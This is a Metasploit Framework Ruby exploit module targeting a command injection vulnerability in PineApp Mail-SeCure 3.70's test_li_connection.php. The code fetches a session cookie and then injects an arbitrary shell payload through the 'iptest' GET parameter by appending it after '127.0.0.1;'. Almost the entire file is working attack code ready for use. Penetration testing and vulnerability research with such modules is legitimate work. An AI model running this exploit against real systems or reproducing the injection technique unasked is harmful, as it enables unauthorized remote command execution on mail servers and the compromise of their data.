
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##
 
require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
 
  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'PineApp Mail-SeCure test_li_connection.php Arbitrary Command Execution',
      'Description'    => %q{
          This module exploits a command injection vulnerability on PineApp Mail-SeCure
        3.70. The vulnerability exists on the test_li_connection.php component, due to the
        insecure usage of the system() php function. This module has been tested successfully
        on PineApp Mail-SeCure 3.70.
      },
      'Author'         =>
        [
          'Dave Weinstein', # Vulnerability discovery
          'juan vazquez'    # Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-13-188/']
        ],
      'Platform'       => ['unix'],
      'Arch'           => ARCH_CMD,
      'Privileged'     => false,
      'Payload'        =>
        {
          'Space'       => 1024,
          'DisableNops' => true,
          'Compat'      =>
            {
              'PayloadType' => 'cmd',
              'RequiredCmd' => 'generic perl python telnet'
            }
        },
      'Targets'        =>
        [
          [ 'PineApp Mail-SeCure 3.70', { }]
        ],
      'DefaultOptions' =>
        {
          'SSL' => true
        },
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Jul 26 2013'
      ))
 
    register_options(
      [
        Opt::RPORT(7443)
      ],
      self.class
    )
 
  end
 
  def my_uri
    return normalize_uri("/admin/test_li_connection.php")
  end
 
  def get_cookies
    res = send_request_cgi({
      'uri' => my_uri,
      'vars_get' => {
        'actiontest' =>'1', # must be 1 in order to start the session
        'idtest' => rand_text_alpha(5 + rand(3)),
        'iptest' => "127.0.0.1" # In order to make things as fast as possible
      }
    })
    if res and res.code == 200 and res.headers.include?('Set-Cookie') and res.headers['Set-Cookie'] =~ /SESSIONID/
      return res.get_cookies
    else
      return nil
    end
  end
 
  def check
    # Since atm of writing this exploit there isn't patch available,
    # checking for the vulnerable component should be a reliable test.
    cookies = get_cookies
    if cookies.nil?
      return Exploit::CheckCode::Safe
    end
    return Exploit::CheckCode::Appears
  end
 
  def exploit
    print_status("#{rhost}:#{rport} - Retrieving session cookie...")
    cookies = get_cookies
    if cookies.nil?
      fail_with(Exploit::Failure::Unknown, "Failed to retrieve the session cookie")
    end
 
    print_status("#{rhost}:#{rport} - Executing payload...")
    send_request_cgi({
      'uri' => my_uri,
      'cookie' => cookies,
      'vars_get' => {
        'actiontest' =>'1', # must be 1 in order to trigger the vulnerability
        'idtest' => rand_text_alpha(5 + rand(3)),
        'iptest' => "127.0.0.1;#{payload.encoded}"
      }
    })
  end
 
end


